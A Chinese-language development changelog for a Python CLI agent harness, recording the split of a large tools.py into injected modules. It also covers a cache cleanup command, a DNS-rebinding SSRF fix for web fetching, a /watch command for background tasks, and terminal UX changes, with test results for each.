- `tools.py` 仍然是最长的文件（2235 行）。按域拆分（shell / 文件 / 文档 / 任务 / 团队）是下一步，
  但会移动 600+ 行 schema 与大量 monkeypatch 目标，应在单独一批里按域逐个拆并逐组跑回归；
  本批先下沉提示组装与标题逻辑；模块仍通过 `_h()` 依赖入口，后续需显式传入运行时依赖。

## 拆分后的边界复查

- 清理 `harness.py` 中拆分遗留的空标题及连续空行，保留主循环阶段顺序。
- 修正提示组装模块的状态说明：它持有 ContextVar 缓存，且仍通过 `_h()` 依赖入口；
  当时以 `_h()` 过渡，后续已改为显式注入（见下一节）。
- 提示组装与缓存命中诊断改写 stderr，并增加输出通道回归，避免污染调用方 stdout。
- 文档测试改为按能力跳过：缺 pypdf 仅跳过 3 项 PDF 文本抽取测试，缺渲染包仅跳过
  3 项实际渲染测试，Office 解析、转换命令及工具边界测试继续执行。
- 修正关于 Codex 文档能力的绝对化说明；是否需要手动安装转换器取决于运行环境与任务。

验证：相关回归 71 passed / 1 skipped（主机不支持符号链接）；屏蔽 pypdf、pypdfium2、PIL
后的文档回归 16 passed / 6 skipped；增量 Ruff 检查通过。
## 解除新模块对入口的反向依赖

**问题**：上一批把提示组装、标题生成下沉到 `src/`，但两者仍通过 `_h()` 回读 harness。
文件变短了，依赖方向没变：任何入口（API / 网关 / SDK）想复用它们，都会把 CLI 入口的
全局状态（`WORKDIR`、`SKILLS_DIR`、`client`、`tool_registry`）一起拖进来；测试也只能
靠 monkeypatch harness 属性间接验证。

**做法**：

- `prompt_assembly` 只保留纯函数：`project_prompt_section(workspace)`、
  `assemble_system_prompt(context)`、`collect_context(workdir, tool_names, skills)`、
  `build_system(...)`、`build_sub_system(...)`；不再 import harness。
- `session_title.generate_session_title(messages, client)`：client 显式传入。
- harness 保留同名薄包装（`project_prompt_section` / `update_context` / `build_system` /
  `build_sub_system` / `generate_session_title`），在这里采集 `get_workdir()`、
  `tool_registry`、`list_skills()` 与 `client`。调用点、subagent 的 `_h()`、review 的调用
  和既有 monkeypatch 目标都不变。
- `_prompt_cache` 只属于 `prompt_assembly`；harness 不再 re-export，测试 fixture 直接
  重置模块自己的 ContextVar。
- 新增 `tests/test_prompt_assembly.py`（注入式采集、子代理提示、包装器接线），并在两个
  测试里加子进程隔离断言：单独 import `prompt_assembly` / `session_title` 时
  `sys.modules` 不含 `harness`。

**踩过的坑**：

- 依赖注入要注入「值」而不是「取数函数」：传 callable 看似更省事，但 callable 仍会捕获
  harness；传值后测试可以直接构造上下文，模块也不需要知道入口如何取数。
- 包装层必须留在 harness：subagent、review 和测试的补丁目标都是 harness 上的名字；直接
  把调用点改成 `src` 函数会绕过所有既有 monkeypatch。
- 子进程断言要手动把 `src` 加进 `sys.path`：开发时是 harness 插入的，不能假设独立进程
  也能 import。
- `_prompt_cache` 若继续从 harness 再导出，测试重置的虽是同一个对象，却掩盖了归属；
  归属清晰后 harness 不再暴露模块内部状态。

**测试**：`pytest` 982 passed / 1 skipped；`ruff check harness.py src tests` 通过；
`harness.py` 2028 → 1984 行。

**收获**：

- 「拆文件」不等于「解耦」：判断标准是模块能否在没有入口的情况下被 import 并测试。
- 依赖方向要单向：入口采集 → src 纯逻辑。反向回读会把入口差异带进共享模块。
- 薄包装层是保留兼容补丁点的低成本方案，代价只是入口多二十来行接线。
## 基础安装验证

**问题**：`requirements.txt` 把 pytest 混进运行时依赖；也从未在「只装基础依赖」的环境验证过，
可选依赖一旦泄漏成必需依赖，只有用户装完才会炸。

**做法**：

- pytest 移到 `requirements-dev.txt`，`requirements.txt` 只保留 openai / python-dotenv /
  prompt-toolkit。
- `--doctor` 增加 `[optional] documents:` 行，报告 pypdf / pypdfium2 / Pillow 是否可用并指向
  `requirements-docs.txt`；缺包只提示，不影响退出码。
- 用 `sys.meta_path` 拦截器模拟缺包：`entrypoint` / `harness` 可导入，35 个工具完成注册，
  `build_system()` 正常，doctor 退出 0，`read_document` / `render_document` 返回安装提示。

**踩过的坑**：

- 本机新建 venv 安装 `requirements.txt` 时 pip 报 openai wheel hash mismatch（期望 264f…，
  实得 3f02…）。这是本机网络/镜像的问题，不是依赖关系问题；为不阻塞验证改用拦截器。
- 拦截器只拦 import、不拦 `find_spec`，所以 `--doctor` 的缺包分支必须在真空环境才准确；
  测试里改用 monkeypatch `importlib.util.find_spec` 覆盖 installed / missing 两条分支。
- 拦截器模拟不了「包存在但版本太老」：版本下限仍只能靠干净环境安装验证。

**测试**：entrypoint / prompt assembly / documents 回归 33 passed；`ruff` 通过。
## 工具缓存的生命周期

**问题**：`.cache/tool_results` 是唯一的无界增长点（大输出 `<call_id>.txt` + 图片
`images/<sha1>`）。直接按时间删会破坏旧会话：图片引用会让 `expand_image_parts` 降级成
文本，大输出的路径则彻底失效；按「只要被引用就不删」又几乎清不掉文件（会话不删就一直引用）。

**做法**：

- 新增 `src/tool_cache.py`：`scan()` 统计占用、`plan_cleanup()` 生成删除计划、
  `apply_cleanup()` 执行。计划规则是「超过保留期（默认 7 天）且没有任何会话再引用」。
- 引用识别不解析事件结构，直接在会话 JSONL 原文里匹配
  `tool_results[/\](images[/\])?<name>`；先把 `\` 折叠成 `\` 以穿过 JSON 转义。
  名字级匹配偏保守：宁可少删。
- 命令 `/cache` 查看占用，`/cache gc [天数]` 预览，`/cache gc [天数] --apply` 才删除；
  删除失败（文件被占用）只记录不中断。
- `--doctor` 增加缓存占用行，顺手能看到是否该清理。

**踩过的坑**：

- 「按天删除」和「引用保护」不能只选一个：只按天会删掉仍在用的图片，只按引用会让
  已删除会话的缓存永远留下。组合规则才能同时满足安全和可回收。
- 路径在事件流里是 JSON 转义后的双反斜杠，正则必须同时接受单/双反斜杠和正斜杠；
  先折叠再匹配比写复杂正则更稳。
- 回收脚本绝不能跟随符号链接：`rglob` + `is_symlink()` 跳过，避免把缓存目录外的
  文件当成缓存删掉。
- `/cache gc` 默认预览：清理属于破坏性操作，必须显式 `--apply`。

**测试**：`tests/test_tool_cache.py` 覆盖统计、引用保护（含 Windows 转义路径）、
近期待保留、预览/执行、空目录与非法天数；总回归 991 passed / 1 skipped。

**收获**：

- 无界增长点的第一步不是「自动清理」，而是把「什么是可删的」写成可测试的规则。
- 生命周期命令要和已有破坏性命令一致：先预览、再执行，输出里给出保留原因计数。
## 拆分 apply_patch 与文件文本原语

**问题**：`tools.py` 2235 行，补丁解析/规划/回滚和文件编码判定都埋在同一个文件里。
这两块都不依赖工具注册表，却因为 `safe_path`、`_capture_checkpoint`、`_gate()` 都在
tools 里而无法搬走；直接 `import tools` 会形成循环依赖。

**做法**：

- `src/tool_text.py`：`decode_text` / `encode_text` / `read_text_file` / `detect_newline`
  与 `BinaryFileError`。只处理字节，不碰路径和工作区，read/edit/patch/grep 共用。
- `src/tool_patch.py`：`parse_patch` / `patch_paths` / `_apply_hunks` / `_plan_patch` /
  `_apply_plans`，对外 `apply_patch(patch, cwd, resolve=, capture=, gate=)`。路径解析、
  checkpoint 捕获与无头审批门由调用方注入，模块本身不 import harness 或 tools。
- `tools.py` 保留 `run_apply_patch` 薄包装，把 `safe_path`、`_capture_checkpoint` 和
  `_gate().enforce_headless` 传进去；`PatchError` / `parse_patch` / `patch_paths`
  继续从 tools 再导出给 `hooks.py` 和策略层。
- 新增 `tests/test_tool_patch.py`（注入顺序、审批拒绝不落盘、回滚）和
  `tests/test_tool_text.py`（BOM/GB18030/二进制/换行）。

**踩过的坑**：

- 循环依赖不能靠 `import tools` 或 `_h()` 绕过：`tools` 要导入提取后的模块，提取后的
  模块又需要 tools 的 `safe_path`。把三个协作者做成参数注入，依赖方向立刻变单向。
- 再导出的名字会被 Ruff 当未使用删掉：`hooks.py` 从 tools 取 `PatchError`，提取后必须
  显式 `# noqa: F401` 保留再导出行，并注明这是统一工具面。
- 换行符与编码必须随补丁一起保留：`encode_text` 用原文件的 encoding/newline 回写，
  否则一次 apply_patch 会把 CRLF/UTF-16 文件整体改写。
- 回滚测试不要依赖真实权限失败：用「父路径是文件」制造 `mkdir` 失败，稳定且跨平台。

**测试**：`tests/` 1001 passed / 1 skipped；`ruff check` 通过；
`tools.py` 2235 → 1893 行，新增模块 380 行。

**收获**：

- 拆大文件的顺序：先找「不依赖注册表」的纯逻辑，再把它的外部依赖做成参数。
- 纯逻辑下沉后，每个模块都能用临时目录 + 假注入独立测试，不必启动整个工具面。
- 兼容层（薄包装 + 再导出）比改所有调用点便宜，但再导出必须显式声明用途。
## 拆分 read / write / edit

**问题**：`tools.py` 里三个文件 handler 依赖 `_gate_file`、`safe_path`、
`_capture_checkpoint`，看起来无法搬走。但 handler 本体的逻辑（分页、编码保留、二进制
保护、先确认能改再抓 pre-image）与工具注册表无关，继续留在 tools 只会让文件反复变长。

**做法**：

- 新增 `src/tool_files.py`：`read_file` / `write_file` / `edit_file`，把边界门（`gate`）、
  路径解析（`resolve`）、checkpoint 捕获（`capture`）作为关键字参数注入。
- `tools.py` 的 `run_read` / `run_write` / `run_edit` 变成三行薄包装，运行时读取
  `safe_path` / `_gate_file` / `_capture_checkpoint`，因此 monkeypatch 这些名字仍然生效。
- `DOCUMENT_SUFFIXES` 随 `read` 迁走；`read_document` / `render_document` 保持在 tools
  （它们与工具面、图片缓存关系更紧）。

**踩过的坑**：

- 按标记切片时把两个未计划迁移的 handler（`read_document` / `render_document`）一起删了：
  切片端点选在 `run_apply_patch` 之前，范围过大。恢复时从 `git show HEAD:src/tools.py`
  取原块，再用 Ruff 找出被连带删除的导入（`documents` / `document_render`）。
- Ruff 会自动删掉「暂时未使用」的导入；恢复代码后必须重新加回来，否则 F821 在测试时才暴露。
- 迁移后残留的 `_DOCUMENT_SUFFIXES` 常量不会触发 lint（模块级赋值不算未使用），
  必须靠 `rg` 搜引用确认，否则会留下两份真值来源。

**测试**：新增 `tests/test_tool_files.py`（注入顺序、拒绝时不解析/不捕获、CRLF 保留、
二进制拒绝、edit 命中后才 capture）；总回归 1007 passed / 1 skipped；
`tools.py` 1893 → 1819 行。

**收获**：

- 切分代码要用精确的起止标记并先 `rg` 确认范围内到底有哪些定义，不能凭行号印象。
- 迁移后被 lint 删掉的导入是「隐式破坏」，恢复块后要跑一次全量 lint + 相关回归。
- 同名薄包装是让 monkeypatch 继续生效的关键：调用方不用改，测试也不用改。
## 拆分只读搜索工具

**问题**：`glob` / `grep` / `ls` 与 ripgrep 快路径共约 300 行，混在 tools 里。
它们只依赖 `resolve` / `gate`、`checkpoints.DEFAULT_SECRETS` 与文本解码，和注册表无关。

**做法**：

- 新增 `src/tool_search.py`：`search_root` / `glob_files` / `grep_files` / `ls_dir`，
  以及 `_secret_file`、`_search_files`、`_match_search_glob` 与 ripgrep 封装。
  路径解析和边界门由 tools 注入。
- `tools.py` 的 `run_glob` / `run_grep` / `run_ls` 改为薄包装；`_grep_with_ripgrep`、
  `_rg_binary` 继续从 tools 再导出。
- 增加 `_grep_backend` 适配器：把「查找 rg」注入 ripgrep 实现的调用点，
  保持后端函数仍是 5 参数签名，测试里的 spy 与自定义 lambda 都不用改。

**踩过的坑**：

- 一开始让 `grep_files` 直接给 backend 传 `rg_binary=` 关键字，自定义后端（只接受
  `*args`）立刻 TypeError。改成适配器后，后端契约保持 5 参数，注入点留在 tools。
- tools 再导出的 `_grep_with_ripgrep` 必须仍被 `run_grep` 引用，否则 Ruff 会把它当
  未使用删掉，测试的 monkeypatch 目标就消失了。
- 移动后 `shutil` / `fnmatchcase` / `is_secret_path` 在 tools 里变成未使用，交给
  `ruff --fix` 清理，再用全量回归确认没有连带删除。

**测试**：新增 `tests/test_tool_search.py`（拒绝时不解析、隐藏项、缺失根目录、
秘密文件过滤）；`tests/test_grep_backend.py` 的 spy 与 rg 回退用例继续通过；
总回归 1011 passed / 1 skipped；`tools.py` 1819 → 1571 行。

**收获**：

- 注入点要选在「替换实现」和「替换查找函数」之间：后端签名越简单，测试越稳。
- 迁移前后都要确认再导出名字仍被引用，否则 lint 会静默删掉兼容层。
## 拆分图片与文档工具

**问题**：`ImageResult`、图片签名识别、缓存落盘与三个文档 handler 约占 200 行，仍是
tools 里最大的一块。它们只依赖路径解析/边界门、`documents`/`document_render` 与
`TOOL_RESULTS_DIR`，和工具注册表无关。

**做法**：

- 新增 `src/tool_documents.py`：`ImageResult`、`image_type`、`cache_image`、
  `view_image`、`read_document`、`render_document`；缓存根目录由 tools 注入。
- tools 保留 `_IMAGE_MAX_BYTES`（测试按 tools 打补丁），包装器在调用时把它传给
  `view_image(..., max_bytes=...)`，补丁仍然生效。
- `ImageResult` 继续从 tools 再导出（harness / subagent / headless 直接 import）。

**踩过的坑**：

- Ruff 会把「只被再导出」的 `ImageResult` 当未使用删掉，`subagent.py` 的
  `from tools import ImageResult` 在 conftest 阶段就 ImportError。再导出必须显式
  `# noqa: F401` 并注明消费方。
- 缓存目录不能在导入时读取 `harness.TOOL_RESULTS_DIR`：conftest 每例都会重定向它。
  包装器改为调用时读取，测试的 monkeypatch 才能生效。
- 大小上限与后端实现分离：上限留在 tools（可打补丁），实现只接收参数。

**测试**：新增 `tests/test_tool_documents.py`（拒绝时不解析、格式不符、内容寻址去重、
渲染页引用落在注入目录）；总回归 1015 passed / 1 skipped；
`tools.py` 1571 → 1467 行。

**收获**：

- 迁移带「类型出口」的代码时，先把消费方列出来，再决定哪些名字需要 noqa 再导出。
- 依赖运行时目录的参数要用「调用时读取」，导入时快照会冻结测试隔离。
## 拆分 todo 清单

**问题**：todo 的校验、内存缓存、事件流写入与格式化约占 130 行，和工具注册表无关。
它唯一依赖的是「当前会话 id」和「当前会话事件流」，而这两个都是 tools 从
`_gate()` / `active_checkpoint_manager()` 拿到的运行时状态。

**做法**：

- 新增 `src/tool_todos.py`：`normalize_todos` / `stats` / `format_todos` /
  `print_todos` / `restore` / `write_todos` / `read_todos`；scope 与 session_store
  作为参数传入。
- tools 保留 `_todo_scope()` 与 `_todo_store()` 两个采集函数，`run_todo_write` /
  `run_todo_read` / `restore_todos` 变成薄包装。
- `_TODOS` 与 `_TODOS_LOCK` 继续从 tools 再导出：测试夹具直接清空内存缓存，
  导入的是同一份对象，清空对实现生效。

**踩过的坑**：

- 会话隔离靠的是「每个会话一个 store」，不是「scope 参数过滤事件」。测试里给两个
  scope 传同一个 store，会误把 A 会话的事件恢复进 B；改为各自独立的 store 才符合
  真实调用路径。
- 内存字典只是缓存，事件流才是唯一持久源：`read_todos` 在内存为空时必须先
  `restore`，否则进程重启后读到空清单。
- 再次导出可变对象（dict + lock）比导出函数更微妙：必须确认是同一对象而非拷贝，
  否则测试清空的是另一份缓存。

**测试**：新增 `tests/test_tool_todos.py`（重复项/多 in_progress/超长校验、事件落盘、
会话隔离、事件恢复、空会话）；总回归 1019 passed / 1 skipped；
`tools.py` 1467 → 1357 行。

**收获**：

- 运行时状态用「采集函数留在入口、纯逻辑放 src」的方式拆，既保持单向依赖，
  又不改变原有 monkeypatch 入口。
- 测试隔离要按真实数据流设计：会话隔离的最小单位是事件流，不是 scope 字符串。
## 拆分任务与 cron 工具

**问题**：任务与 cron 共 8 个 handler 约 60 行，混在 tools 里。它们不依赖 harness
状态，只调用 `task_system` / `cron_scheduler`，再拼输出文本。

**做法**：

- 新增 `src/tool_tasks.py`：`run_create_task` / `run_list_tasks` / `run_get_task` /
  `run_claim_task` / `run_complete_task` / `run_schedule_cron` / `run_list_crons` /
  `run_cancel_cron`，直接依赖两个子系统的公开函数。
- tools 不再保留同名定义，改为从 `tool_tasks` 导入并再导出；`tool_registry` 与
  `TOOLS` schema 不变。
- 依赖按模块名调用（`tool_tasks.schedule_job`），测试可以只替换一个名字，
  不用拉起真实 cron 存储。

**踩过的坑**：

- 这组没有 `_h()` 依赖，因此不需要薄包装；直接 import 即可，注册表引用的是同一个
  函数对象。
- 再导出的 8 个名字都会被 Ruff 当作未使用（注册表用的是模块全局查找），必须整块
  `# noqa: F401` 并注明「注册表与 Teammate 从这里取 handler」。
- `cron_scheduler` 的持久化路径是模块级常量，handler 测试要替换 `scheduled_jobs`
  与 `schedule_job`，不能真写 `.cache/crons.json`。

**测试**：新增 `tests/test_tool_tasks.py`（空列表、owner/依赖格式、任务不存在、
cron 错误透传、调度/列表/取消、空 cron 列表）；总回归 1025 passed / 1 skipped；
`tools.py` 1357 → 1309 行。

**收获**：

- 没有运行时状态依赖的域可以直接「搬函数 + 再导出」，不需要注入层。
- 再导出的 noqa 是兼容声明：它告诉后来者这些名字不是死代码，而是注册表的入口。
## 拆分 shell / 后台任务 / 联网抓取

**问题**：`run_bash` 与两个后台任务 handler、`run_web_fetch` 共约 180 行。它们依赖
`sandbox`、`process_utils`、`web_access` 和入口注入的工作区/审批门，但本体与工具
注册表无关。

**做法**：

- 新增 `src/tool_exec.py`：`bash_timeout` / `bash` / `run_background_output` /
  `run_kill_background` / `fetch_url`。工作区、审批门与三个超时常量由 tools 注入。
- tools 保留 `BASH_TIMEOUT` 等常量（测试按 `tools.BASH_TIMEOUT` 打补丁），
  `run_bash` / `run_web_fetch` 是薄包装；两个后台任务 handler 直接再导出。
- 审批门作为函数传入（`gate('bash', {...})`），不再在实现里取 `_gate()`。

**踩过的坑**：

- 测试用 `tools.subprocess.Popen` 拦截进程启动，靠的是「tools 曾 import subprocess」
  这个副作用。搬走后 tools 不再有 subprocess 属性，补丁点直接 ImportError。
  补丁点改成 `sandbox.subprocess.Popen`——真正调用 Popen 的模块，语义也更准确。
- 超时常量不能搬进实现：`tests/test_turn_progress.py` 会改 `tools.BASH_TIMEOUT`
  来缩短等待。把常量做成参数、由包装器每次传入，补丁才能生效。
- 后台任务的 `current_background_id` 是 contextvar，读取必须发生在调用时，
  不能在导入时求值。

**测试**：新增 `tests/test_tool_exec.py`（超时校验、拒绝时不 spawn、超时非法值不 spawn、
fetch 拒绝时不联网、截断与响应头、后台 id 校验）；更新 `test_execution_paths.py` 的
补丁点；总回归 1031 passed / 1 skipped；`tools.py` 1309 → 1167 行。

**收获**：

- 迁移会「顺带」破坏基于模块属性的补丁点，测试通过与否取决于是否 import 过某模块；
  补丁应指向真正执行副作用的模块。
- 可调常量保持「入口持有、实现接收」，是兼容测试补丁的低成本做法。
## 拆分团队协作工具

**问题**：派生 teammate、消息收发与 lead 协议共 6 个 handler 约 60 行，混在 tools
里；它们只依赖 `agent_teams.BUS` / `team_protocols`，与注册表无关。

**做法**：

- 新增 `src/tool_teams.py`：`run_spawn_teammate` / `run_send_message` /
  `run_check_inbox` / `run_request_shutdown` / `run_request_plan` /
  `run_review_plan`，直接复用两个子系统的公开对象。
- tools 改为导入并再导出，`tool_registry` 与 schema 不变；协议状态仍由
  `team_protocols.pending_requests` 持有，没有复制。

**踩过的坑**：

- 这组没有入口状态依赖，不需要注入层；但 `pending_requests` 是模块级字典，
  测试必须在 fixture 里清空，否则用例之间会互相看到上一条请求。
- `BUS.send` 的参数顺序是 `(sender, target, content, type, payload)`；断言时
  按位置取字段容易错位，最好按语义取 `sent[0][1]` / `sent[0][2]`。

**测试**：新增 `tests/test_tool_teams.py`（发送通道、收件箱空/非空、shutdown 请求落表、
plan 请求、审批通过/已处理/不存在、派生透传）；总回归 1037 passed / 1 skipped；
`tools.py` 1167 → 1119 行。

**收获**：

- 纯委托型 handler 最适合直接搬迁：没有状态、没有注入，测试用假 BUS 即可。
- 共享可变状态（pending_requests）的测试隔离必须显式写，不能靠用例顺序。
## 拆分工具 schema

**问题**：`tools.py` 里约 900 行是 `TOOLS` 的 JSON 字面量，与 handler 交错排列。
它既不是逻辑也不是配置，却让这个文件永远无法变短。

**做法**：

- 新增 `src/tool_schemas.py`：`TOOL_SCHEMAS` 保存 37 个工具定义，顺序与拆分前逐字一致。
  内容由运行时 `TOOLS` 用 `pprint(sort_dicts=False)` 生成，避免手抄出错。
- `tools.py` 只保留 `TOOLS = list(TOOL_SCHEMAS)`，仍然是可变列表（MCP 运行期追加）。
- 拆分前先加 `tests/test_tool_schemas.py`：锁定工具名称顺序、`json.dumps` 指纹、
  「除 checkpoint/compact 外每个 schema 都有 handler」。拆分后三条全部通过。

**踩过的坑**：

- 用 `ast` 取语句行号后**按升序边删边改**，后面的行号全部错位：第一段 583 行被替换成
  1 行，剩余 14 个 append 全没删到，文件反而保留了两份 schema。正确做法是从后往前删，
  或先收集所有待删区间再一次性重建。
- 发现错位后先 `git checkout` 还原，再重跑；不要在已经错位的文件上继续打补丁。
- `TOOL_SCHEMAS` 的 import 不能留在文件中部（E402），但 `TOOLS = list(...)` 保留原位，
  这样 diff 只动 schema 行。

**测试**：`pytest` 1040 passed / 1 skipped（新增 3 条 schema 快照）；`ruff` 通过；
`tools.py` 1119 → 245 行，`tool_schemas.py` 504 行。

**收获**：

- 大块数据搬迁先「从运行态生成」再「删源码」，比手工复制安全；生成物用快照测试锁住。
- 按行号批量编辑必须在「删除/替换」前固定坐标系；倒序处理是最小改动方案。
## 重构收尾检查

**检查范围**：拆分完成后对文档、死代码、格式与契约做一次盘点。

**发现并修正**：

- `tools._cache_image` 在迁移后已无调用方（`run_view_image` / `run_render_document`
  直接用 `_tool_results_dir()`），删除包装与对应的 `cache_image` 导入。
- `TOOLS = list(TOOL_SCHEMAS)` 后残留三连空行；顺手把紧凑的 `tool_registry`
  字典改成每行一项，文件已经足够短，可读性比省行更重要。
- `README` 项目结构表缺 `src/tools.py` 一行；`design-principles` 与
  `HARNESS_LOOP_ARCHITECTURE` 的模块表仍写着「tools.py 含 schema 与任务/团队实现」，
  改为「接线与注册表 + `tool_schemas.py` + `tool_*.py`」。
- `HARNESS_LOOP_ARCHITECTURE` 里 `compact` 的说明引用了已失效的
  `tools.py:670-680` 行号，改为指向 `tool_schemas.py`。
- `coding-standards` 的「改工具行为必须同步 tools.py 的 schema」改为
  `tool_schemas.py`，并注明顺序由快照测试锁定。
- `tool_schemas.py` 头部补充重新生成方式与「顺序即契约」的说明。

**新增护栏**：`test_tools_is_a_mutable_copy_of_the_schema_list` 断言
`tools.TOOLS is not tool_schemas.TOOL_SCHEMAS`，防止将来改成直接别名后，
MCP 运行期 `append` 污染规范列表（进而让下次启动多出重复工具）。

**验证**：`pytest` 1041 passed / 1 skipped；`ruff check harness.py src tests`
通过；`--doctor` 正常。

**核对过但无需改动**：

- `tool_registry` 覆盖 37 个 schema 中 35 个，`checkpoint` / `compact` 由主循环特判，
  与既有设计一致。
- `harness.TOOLS.append` 与 `tools.TOOLS` 是同一列表对象（`from tools import TOOLS`），
  MCP 动态注册路径未受影响。
- 十个 `tool_*` 模块都有同名测试文件；`tool_text` / `tool_patch` 等纯函数模块
  不依赖 harness，子进程隔离断言仍在。

**收获**：

- 重构后的「收尾检查」应当把文档当作代码审计：本轮所有偏差都在文档与死代码，
  没有行为回归。
- 兼容性再导出最容易留下死名字；每次拆分后跑一次 `rg` 确认调用方，
  比等 lint 发现更早。
## 联网连接期地址固定（DNS 重绑定）

**问题**：`web_fetch` 先 `getaddrinfo` 校验，再由 `urllib` 自己解析一次并连接。
两次解析之间如果 DNS 从公网翻到 `127.0.0.1`，校验通过、连接落到私网——典型的
TOCTOU 型 SSRF。重定向已有复检，但同一次请求内仍有这个窗口。

**做法**：

- `public_addresses()` 返回「全部公网」的地址列表（混合解析整批拒绝），
  `resolve_public_host()` 保留为兼容入口。
- 直连时给本次请求生成一个连接子类，把 `_create_connection` 固定到校验过的字面
  IP 和端口：`http.client` 仍用原主机名写 Host、做 TLS SNI 与证书校验，
  但 socket 不再二次 DNS。
- 用 `_PinnedHTTPHandler` / `_PinnedHTTPSHandler` 替换默认 handler，重定向回到
  `opener.open` 时按新 URL 重新固定；`fetch` 让连接期的 `WebAccessError` 原样透出。
- 代理请求不做固定：`ProxyHandler` 已把 `req.host` 改写成代理主机，DNS 由代理
  完成；本地代理本身常是私网地址，按目标地址校验反而会误杀合法代理。

**踩过的坑**：

- `Request` 没有 `.port` 属性；直接连接时端口并进 `req.host`（`host:port`），
  必须用 `urlsplit('//' + req.host)` 统一解析。否则带端口的 URL 会被误判成代理，
  静默跳过固定。
- 判断「是否走代理」不能靠环境变量：本机注册表里就配了 `127.0.0.1:10090` 代理，
  `getproxies()` 非空。用 `req.host` 与 URL 主机是否一致来判定，跨平台且精确。
- 本机存在系统代理时，直连分支的测试必须先把 `getproxies` 置空，否则用例测到的是
  代理路径；反过来，这也暴露了真实边界：代理场景的 DNS 校验只能依赖代理。
- 固定地址后仍要保留证书校验：连接类只替换 `_create_connection`，`HTTPSConnection`
  继续用 `self.host` 做 `server_hostname`，不能改成 IP。

**测试**：`tests/test_web_fetch.py` 新增 4 条——连接使用校验后的字面 IP、代理请求
跳过固定、本地 HTTP 服务验证「主机名不可解析但固定地址可连通」、连接期拒绝原样
抛 `WebAccessError`；总回归 1045 passed / 1 skipped。

**收获**：

- 防 SSRF 的校验和连接必须绑在同一次解析结果上，否则校验只是一次采样。
- 代理是安全边界的黑洞：代码能做的只有明确降级并写进边界文档，而不是假装覆盖。
## 新增 /watch：后台任务跟踪

**问题**：长命令转入后台后，CLI 侧只能反复调用 `background_output(wait=true)` 或轮询；
`design-principles` 的「当前边界」里还挂着「`/watch` 第四阶段未实施」，但仓库里从
没有 `/watch` 的任何阶段。飞书进度卡片已经是约 0.6s 的 tick 刷新，不需要单独的事件推送，
所以这轮只补 CLI 的缺口，并把边界描述改成事实。

**做法**：

- `background_task.list_background_tasks()`：返回活跃 + 最近完成任务（含 id），按时间倒序。
- `src/background_watch.py`：`format_tasks` / `watch` / `watch_command`。
  - `/watch` 列出任务：状态图标、已用时、命令；
  - `/watch <bg_id> [--timeout 秒]` 等到终态后打印全文与总用时；
  - 运行中每秒刷新一行状态；超时或 Ctrl-C 只停止跟踪，任务继续在后台跑。
- 命令注册进 `cli_commands`，harness 增加一个 dispatch 分支；帮助里自动出现。

**没做的事（有意）**：

- 不做「实时 tail 进程输出」：后台 worker 只在结束时把结果写进 `background_results`，
  运行中拿不到增量字节。假装能 tail 只能靠改 worker 的落盘方式，属于另一个改动。
- 不做飞书侧的独立事件推送：卡片已经按进度 tick 刷新，再加一套推送只会增加频控风险。

**踩过的坑**：

- 终止态任务会被 `read_background_result` 移出活跃表并写入历史，`/watch` 必须用
  `background_snapshot` 判断状态、再调 `read_background_result` 取全文，顺序反了会
  把任务「消费」掉。
- 超时循环用 `clock()` 计算剩余时间、`sleep(min(interval, remaining))` 限幅，
  测试里把两者都注入，才能不真的等满 10 分钟。
- Ctrl-C 不能吞掉任务：只退出循环并提示「任务继续在后台运行」，否则用户会以为
  命令停了任务也停了。

**测试**：新增 `tests/test_background_watch.py`（空列表/列表格式、终态直取、running→completed
跟随、超时保留运行状态、Ctrl-C 脱离、未知 id、参数校验）；总回归 1052 passed / 1 skipped。

**收获**：

- 「未实施」的边界条目要先确认它到底指什么；仓库里没有设计时，按最小可用语义实现并
  写清没做的部分，比照搬一个不存在的「第四阶段」更可靠。
- 阻塞式观看命令必须有脱离路径和「不影响后台任务」的明确提示。
## /watch 不需要记任务编号

**问题**：`/watch <bg_id>` 要求用户先 `/watch` 看列表、再抄一个 `bg_0001`。后台任务
通常只有一两个，记编号是多余负担——命令应该默认面向「最新那个任务」。

**做法**：

- `/watch` 不带参数时直接跟踪**最新的后台任务**：运行中则等到终态，已结束则立即
  打印全文；没有任务时退回列表提示。
- `/watch --list`（`-l`）保留完整列表；`bg_id` 只在要指定旧任务时才需要。
- `--timeout` 可以单独使用（作用于最新任务），也可以放在 id 前后。
- 多个任务同时在跑时，选最新的并提示「另有 N 个任务在运行，用 /watch --list 查看」。

**踩过的坑**：

- 参数解析要允许「只有 flag、没有 id」，否则默认目标永远解析不出来；把 id 设为
  可选后，`--timeout` 必须能从任意位置解析。
- 默认行为复用同一个 `watch()`：终态任务本来就会立即返回全文，不需要为「已结束」
  写第二条分支。
- 多任务提示写到 stdout 而不是状态行，避免被每秒刷新的状态覆盖。

**测试**：新增 4 条（无 id 跟踪最新、空列表提示、`--list`、`--timeout` 单独使用）；
总回归 1056 passed / 1 skipped。

**收获**：

- 破坏性小、收益明确的 UX 改进应当直接改默认值，而不是再加一个 `--latest` 旗标。
- 默认目标 = 最近活跃对象；显式编号只作为「翻旧账」的逃生口。
## 终端体验对齐 Codex / Pi

**问题**：交互回合里除了最终回答什么都没有——模型思考期间屏幕静止，工具调用完全不可见，
启动信息只有三行且不含模型/档位；输入没有跨会话历史，Ctrl-C 在提示符处直接退会话。
这些正是 Codex / Pi 做得最顺手的地方。

**做法**：

- 工具活动行：`exec_tool_call` 计时并回调 `on_activity`，输出
  `• bash  pytest -q  3.40s ✓`（失败 `✗`、后台 `↗后台`）。并行批次先收集、再按模型给定
  的原序打印，避免多线程互相覆盖；只在 TTY 时输出，管道/测试/无头保持安静。
- 进度行：`turn_progress.ProgressTicker` 每 0.5s 用 `\r\033[K` 重绘
  `⏳ 00:07 · 正在执行 bash`；首个流式片段到来前停止并清行，回合结束兜底清除。
- 启动头：会话短 ID + 标题、模型、工作区、档位/审批/沙箱、快捷键提示。
- 输入：`FileHistory(.cache/cli_history)` 跨会话历史 + ↑ 前缀搜索；Ctrl-J 插入换行，
  Enter 仍提交。
- Ctrl-C：提示符处第一次只提示、第二次退出；回合中保持中断当前回合。

**踩过的坑**：

- 进度行不换行，活动行若直接 `print` 会接在计时后面；活动行必须走 ticker 的
  `emit_line()`，在锁内先清行再输出，否则会和 tick 线程抢同一行。
- 反过来，活动行不能无条件 `\r\033[K`：流式回答可能停在半行，清行会把已经上屏的
  文字擦掉。只有存在活动 ticker 时才清。
- 并行工具批次在线程里跑 `exec_tool_call`，直接打印会交错；回调只收集，join 后按
  `tool_calls` 原序补打。
- `sys.stdout` 在测试里是捕获对象；活动行测试要显式替换成 `isatty()=True` 的 stream，
  否则测不到输出分支。
